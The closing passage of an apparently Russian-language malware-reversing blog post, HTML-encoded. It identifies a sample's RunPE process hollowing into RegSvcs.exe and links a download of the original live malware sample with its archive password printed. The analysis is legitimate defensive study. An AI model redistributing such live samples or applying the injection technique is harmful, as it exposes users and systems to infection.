<p>&Gcy;&acy;&dcy;&acy;&tcy;&softcy; &tcy;&ucy;&tcy; &ocy;&scy;&ocy;&bcy;&ocy; &ncy;&iecy; &ncy;&acy;&dcy; &chcy;&iecy;&mcy; &ndash; &mcy;&ycy; &icy;&mcy;&iecy;&iecy;&mcy; &dcy;&iecy;&lcy;&ocy; &scy; RunPE. &Ncy;&acy; &ecy;&tcy;&ocy; &ucy;&kcy;&acy;&zcy;&ycy;&vcy;&acy;&iecy;&tcy; &ncy;&iecy;&scy;&kcy;&ocy;&lcy;&softcy;&kcy;&ocy; &vcy;&iecy;&shchcy;&iecy;&jcy;:</p>
<ul>
<li>&Scy;&kcy;&rcy;&icy;&pcy;&tcy; &zcy;&acy;&pcy;&ucy;&scy;&kcy;&acy;&iecy;&tcy; dll&rsquo;&kcy;&ucy; &scy; &acy;&rcy;&gcy;&ucy;&mcy;&iecy;&ncy;&tcy;&ocy;&mcy; <code>RegSvcs.exe</code> &vcy; &vcy;&icy;&dcy;&iecy; &zhcy;&iecy;&rcy;&tcy;&vcy;&ycy; (&pcy;&ocy;&pcy;&ucy;&lcy;&yacy;&rcy;&ncy;&ycy;&jcy; &vcy; RunPE &bcy;&icy;&ncy;&acy;&rcy;&ncy;&icy;&kcy;)</li>
<li>&Pcy;&rcy;&ocy;&tscy;&iecy;&scy;&scy; &zcy;&acy;&pcy;&ucy;&scy;&kcy;&acy;&iecy;&tcy;&scy;&yacy; &vcy; &zcy;&acy;&mcy;&ocy;&rcy;&ocy;&zhcy;&iecy;&ncy;&ncy;&ocy;&mcy; &scy;&ocy;&scy;&tcy;&ocy;&yacy;&ncy;&icy;&icy;</li>
<li>&Pcy;&ocy;&scy;&lcy;&iecy; &pcy;&iecy;&rcy;&iecy;&zcy;&acy;&pcy;&icy;&scy;&icy; &pcy;&acy;&mcy;&yacy;&tcy;&icy; &pcy;&rcy;&ocy;&tscy;&iecy;&scy;&scy;&acy; &ocy;&ncy; &rcy;&acy;&zcy;&mcy;&ocy;&rcy;&acy;&zhcy;&icy;&vcy;&acy;&iecy;&tcy;&scy;&yacy; &icy; &vcy;&ycy;&pcy;&ocy;&lcy;&ncy;&yacy;&iecy;&tcy;&scy;&yacy;</li>
</ul>
<p>&Ncy;&ucy;, &vcy;&ocy;&tcy;, &scy;&ocy;&bcy;&scy;&tcy;&vcy;&iecy;&ncy;&ncy;&ocy;, &icy; &vcy;&scy;&iocy;!</p>
<h2 id="vmesto-zakliucheniia"><p class="colored-text-1" style="font-size: 32px;">&gt;</p> &Vcy;&mcy;&iecy;&scy;&tcy;&ocy; &zcy;&acy;&kcy;&lcy;&yucy;&chcy;&iecy;&ncy;&icy;&yacy;</h2>
<p>&Dcy;&lcy;&yacy; &tcy;&iecy;&khcy;, &kcy;&tcy;&ocy; &zcy;&acy;&khcy;&ocy;&chcy;&iecy;&tcy; &scy;&acy;&mcy;&ocy;&scy;&tcy;&ocy;&yacy;&tcy;&iecy;&lcy;&softcy;&ncy;&ocy; &pcy;&rcy;&ocy;&jcy;&tcy;&icy; &ecy;&tcy;&ocy;&tcy; &ncy;&iecy;&bcy;&ocy;&lcy;&softcy;&shcy;&ocy;&jcy; &pcy;&ucy;&tcy;&softcy;, &pcy;&rcy;&icy;&lcy;&ocy;&zhcy;&ucy; &scy;&scy;&ycy;&lcy;&kcy;&ucy; &ncy;&acy; &ocy;&rcy;&icy;&gcy;&icy;&ncy;&acy;&lcy;&softcy;&ncy;&ycy;&jcy; &fcy;&acy;&jcy;&lcy;: <a download="" href="/files/reveresing-malware/original.7z">&Tcy;&Ycy;&Kcy;</a>.</p>
<p>&Pcy;&acy;&rcy;&ocy;&lcy;&softcy;: <code>naweka.github.io</code>.</p>
<p>&Rcy;&acy;&zcy;&ucy;&mcy;&iecy;&iecy;&tcy;&scy;&yacy;, &vcy; &ocy;&zcy;&ncy;&acy;&kcy;&ocy;&mcy;&icy;&tcy;&iecy;&lcy;&softcy;&ncy;&ycy;&khcy; &tscy;&iecy;&lcy;&yacy;&khcy; :)</p>
    </div>
    <!-- <hr>
    <div class="condensed-font">
    <br>
    For comments, click the arrow at the top right corner.
    <br><br>
    </div> -->
</section>

	<hr>
	<!-- Disqus -->
	<div id="disqus_thread"></div>
	<script>
	var disqus_config = function() {
		this.page.url = 'http://localhost:8000//reveresing-malware.html';
		this.page.identifier = 'reveresing-malware.html';
	};
	(function() {
		var d = document, s = d.createElement('script');
		s.src = '//True.disqus.com/embed.js';
		s.setAttribute('data-timestamp', +new Date());
		(d.head || d.body).appendChild(s);
	})();
	</script>
               <hr>
           </article>
       </div>
   </div>  </body>
</html>